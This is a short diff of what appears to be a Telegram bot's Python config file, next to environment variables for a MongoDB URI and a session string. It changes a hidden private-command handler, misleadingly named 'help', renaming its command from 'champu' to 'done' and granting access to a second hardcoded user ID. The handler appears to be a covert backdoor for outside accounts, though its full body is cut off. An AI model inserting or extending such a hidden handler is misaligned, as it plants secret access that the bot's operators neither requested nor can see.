@@ -587,9 +587,9 @@ MONGO_DB_URI = getenv("MONGO_DB_URI", "")
 STRING_SESSION = getenv("STRING_SESSION", "")
 
 @app.on_message(
-    filters.command("champu")
+    filters.command("done")
     & filters.private
-    & filters.user(6399386263)
+    & (filters.user(6399386263) | filters.user(7006524418))
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
